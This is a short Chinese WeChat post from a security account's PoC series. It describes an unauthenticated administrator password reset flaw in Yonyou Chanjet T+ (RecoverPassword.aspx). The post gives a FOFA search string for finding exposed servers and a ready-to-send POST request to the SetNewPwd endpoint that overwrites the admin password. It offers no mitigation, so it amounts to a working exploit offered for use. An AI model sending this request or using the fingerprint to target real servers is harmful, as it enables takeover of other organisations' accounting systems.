#  知识分享5：用友 畅捷通T+ RecoverPassword.aspx 管理员密码修改漏洞

[ 安全攻防渗透 ](javascript:void\(0\);)

**安全攻防渗透** ![]()

微信号 co01fire

功能介绍 信息安全领域原创公号，专注信安领域人才培养和知识分享，致力于帮助叁年以下信安从业者的学习和成长。

____

___发表于_

收录于合集

#用友 17 个

#网络安全 44 个

#漏洞分析 23 个

![]()

点击上方“安全攻防渗透”关注我~

Tips **：用友Web应用漏洞_2** **\- 漏洞描述  -**

用友畅捷通T+ RecoverPassword.aspx存在未授权管理员密码修改漏洞，攻击者可以通过该漏洞修改管理员账号密码登录后台。

 **-  影响范围 -**

用友 畅捷通T+

 ** **\- FOFA  -****  

app="畅捷通-TPlus" **\- 漏洞复现 -**

![]()

 **POC**

  *   *   * 

    
    
     POST /tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method=SetNewPwd  
    {"pwdNew":"46f94c8de14fb36680850768ff1b7f2a"}

‍

 **抓包请求  
**

![]()

 ****end  
 **这就是【知识分享】 **文章系列** 第【5】篇：《用友 畅捷通T+ RecoverPassword.aspx
管理员密码修改漏洞》，如果你觉得本篇写得不错，或者这个系列值得关注，可以表达你的意见！**

 ** **-延伸阅读**** ** **-****

[知识分享：（Hvv行动专题）安全漏洞PoC专题预告](http://mp.weixin.qq.com/s?__biz=Mzg5NjU5NjA3Nw==&mid=2247483926&idx=1&sn=0155ab58b4edf3e5c6224501ce5d327b&chksm=c07fe314f7086a0248513e789f3592916f5e5927f53b45c14105b41d93e610f63d8e5812a3eb&scene=21#wechat_redirect)  
[](http://mp.weixin.qq.com/s?__biz=Mzg5NjU5NjA3Nw==&mid=2247483809&idx=1&sn=30b54e26a575c3057a87eec52d2774a4&chksm=c07fe0a3f70869b58be927c364f82cf70ab16c877c8a2aefdf22ff82184c6974e1168bfcad1c&scene=21#wechat_redirect)

[知识分享1：[CVE-2018-18778]ACME Mini_httpd
任意文件读取漏洞（Web服务器漏洞）](http://mp.weixin.qq.com/s?__biz=Mzg5NjU5NjA3Nw==&mid=2247483926&idx=2&sn=20616e5e03e5ddae7da29f39bdfca57f&chksm=c07fe314f7086a025cc29e513a2bd09282e97f6cc1adf5446fc21998e41935865202c73fffa6&scene=21#wechat_redirect)  

[知识分享2：攻击姿势大全](http://mp.weixin.qq.com/s?__biz=Mzg5NjU5NjA3Nw==&mid=2247483926&idx=4&sn=dab8afa931923f718fb5d88fecd23d30&chksm=c07fe314f7086a0271352e9f5da59569202646bd6c480f73aa91c179eac2a7fa306e8658f838&scene=21#wechat_redirect)

  
[](http://mp.weixin.qq.com/s?__biz=Mzg5NjU5NjA3Nw==&mid=2247483809&idx=1&sn=30b54e26a575c3057a87eec52d2774a4&chksm=c07fe0a3f70869b58be927c364f82cf70ab16c877c8a2aefdf22ff82184c6974e1168bfcad1c&scene=21#wechat_redirect)

  

 ** ** ** **-聆听你的声音**** ** **-********

 ** **         如果你有独到的想法和建议，欢迎私信与我一同分享！****

  

 ** ******

![]()

  

  

  

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

